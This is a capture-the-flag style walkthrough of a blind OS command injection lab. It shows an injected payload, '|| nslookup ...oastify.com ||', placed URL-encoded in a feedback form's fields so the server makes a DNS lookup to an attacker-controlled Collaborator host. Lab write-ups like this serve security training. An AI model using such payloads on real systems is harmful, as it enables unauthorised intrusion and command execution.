# Lab: Blind OS command injection with out-of-band interaction

 The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. 

**Note**
*To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server. *

# Step 1 Get attack server address

Get the attack server address from burp collaborator, by clicking on the `copy to clipboard` link

![image](https://user-images.githubusercontent.com/83407557/209209944-c3779fbc-6bff-44c6-8c0e-90ca14883d3c.png)

I get the following address

7nvgowwpcqy3uyglwc2q7hzzuq0ho7cw.oastify.com

# Step 2 Finding OS command injection in webapp

Using the feedback link

![image](https://user-images.githubusercontent.com/83407557/209210276-2ef1da02-b3a2-4633-a1cd-17c4940c0f3b.png)

![image](https://user-images.githubusercontent.com/83407557/209210480-8cf91e90-9dfa-4923-9e81-8effe0485663.png)

Capturing this form with burp I inspect the POST request

![image](https://user-images.githubusercontent.com/83407557/209210645-7f67b44a-7870-4257-9ba0-443e93d165f7.png)

# Step 3 creating payload

To have a server make a dns request to my sever using command seperaters I will use the following:

```bash
|| nslookup 7nvgowwpcqy3uyglwc2q7hzzuq0ho7cw.oastify.com ||
```

# Step 4 inject payload in all the possible locations

Notice each payload is url encoded 

![image](https://user-images.githubusercontent.com/83407557/209212355-4bf2119c-ac69-478d-a15d-40abbda5fd89.png)

# Step 5 check attack server for DNS requests

I see that there was infact OS command injection

![image](https://user-images.githubusercontent.com/83407557/209212510-38806024-4cf7-40e0-9efe-bbc3fbdbea86.png)

With the DNS request the lab is solved:

![image](https://user-images.githubusercontent.com/83407557/209213225-099c472b-9395-41c1-8fd6-c4557f03339a.png)
